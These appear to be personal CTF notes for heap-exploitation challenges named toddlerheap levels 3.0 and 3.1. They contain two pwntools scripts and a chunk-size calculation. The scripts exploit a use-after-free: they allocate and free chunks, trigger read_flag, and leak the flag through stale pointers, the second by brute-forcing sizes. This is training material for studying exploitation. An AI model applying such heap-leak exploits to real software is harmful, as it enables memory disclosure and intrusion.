
whataver this abomination is 

```py
from pwn import *

context(log_level="info")
FILE = "/challenge/toddlerheap_level3.0"

def launch():
    elf = ELF(FILE)
    context.binary = elf
    return process(elf.path)


def malloc(p, idx, size):
    p.sendlineafter(b"(malloc/read_flag/free/puts/quit): ", b"malloc")
    p.sendlineafter(b"Index: ", str(idx).encode())
    p.sendlineafter(b"Size: ", str(size).encode())

def free(p, idx):
    p.sendlineafter(b"(malloc/read_flag/free/puts/quit): ", b"free")
    p.sendlineafter(b"Index: ", str(idx).encode())

def read_flag(p):
    p.sendlineafter(b"(malloc/read_flag/free/puts/quit): ", b"read_flag")

def puts_idx(p, idx):
    p.sendlineafter(b"(malloc/read_flag/free/puts/quit): ", b"puts")
    p.sendlineafter(b"Index: ", str(idx).encode())
    p.recvuntil(b"Data: ")
    leak = p.recvline(keepends=False)
    return leak

def main():
    p = launch()

    ALLOC_SIZE = 0x7d0 
    NUM_CHUNKS = 4

    log.info(f"Allocating {NUM_CHUNKS} chunks of size {hex(ALLOC_SIZE)}... ")
    for i in range(NUM_CHUNKS):
        malloc(p, i, ALLOC_SIZE)

    log.info("Freeing chunks in reverse order to consolidate them...")
    for i in reversed(range(NUM_CHUNKS)):
        free(p, i)

    log.info("Calling read_flag() to place the flag into the freed region...")
    read_flag(p)


    log.info("Searching for the flag in the freed chunks...")
    for i in range(NUM_CHUNKS):
        log.info(f"Checking for leak in original chunk index {i}...")
        leak = puts_idx(p, i)
        print("This is leak : ",leak)
        
        if b"pwn{" in leak:
            try:
                start = leak.find(b"pwn{")
                end = leak.find(b"}", start) + 1
                flag = leak[start:end].decode()
                log.success(f"SUCCESS! Flag found: {flag}")
                break
            except (ValueError, TypeError):
                log.warning(f"Found 'pwn{{' but could not decode the flag in leak: {leak}")

    p.close()

if __name__ == "__main__":
    main()
```

for the first challenge :
652 + 16 = 668
we want it dividible by 16 so we get 672
we have 10 chunks so we must reach 10th chunk
9 * 672 = 6048  (0x17A0)
3 * size = 6048
size = 2016 = 0x7E0 
0x7E0 - 16 = 2000 = 0x7d0
so we get 4 chunks with 0x7do chunk size
we got : 
    ALLOC_SIZE = 0x7d0 
    NUM_CHUNKS = 4

# 3.1 solution 

```py
### 3.1 brute force
from pwn import *

context(log_level="info")
FILE = "/challenge/toddlerheap_level3.1"

def launch():
    elf = ELF(FILE)
    context.binary = elf
    return process(elf.path)


def malloc(p, idx, size):
    p.sendlineafter(b"(malloc/read_flag/free/puts/quit): ", b"malloc")
    p.sendlineafter(b"Index: ", str(idx).encode())
    p.sendlineafter(b"Size: ", str(size).encode())

def free(p, idx):
    p.sendlineafter(b"(malloc/read_flag/free/puts/quit): ", b"free")
    p.sendlineafter(b"Index: ", str(idx).encode())

def read_flag(p):
    p.sendlineafter(b"(malloc/read_flag/free/puts/quit): ", b"read_flag")

def puts_idx(p, idx):
    p.sendlineafter(b"(malloc/read_flag/free/puts/quit): ", b"puts")
    p.sendlineafter(b"Index: ", str(idx).encode())
    p.recvuntil(b"Data: ")
    leak = p.recvline(keepends=False)
    return leak

def main():
    for k in range(4900, 7000):
        print(f"Malloc: {k}")
        p = launch()

        ALLOC_SIZE = k

        malloc(p, 0, k)
        malloc(p, 1, 2000)

        log.info("Freeing chunks in reverse order to consolidate them...")
        free(p, 1)
        free(p, 0)

        log.info("Calling read_flag() to place the flag into the freed region...")
        read_flag(p)

        log.info("Searching for the flag in the freed chunks...")

        log.info(f"Checking for leak in original chunk index 1...")
        leak = puts_idx(p, 1)
        print("This is leak : ", leak)
        
        if b"pwn." in leak:
            break

        p.close()   

if __name__ == "__main__":
    main()
```




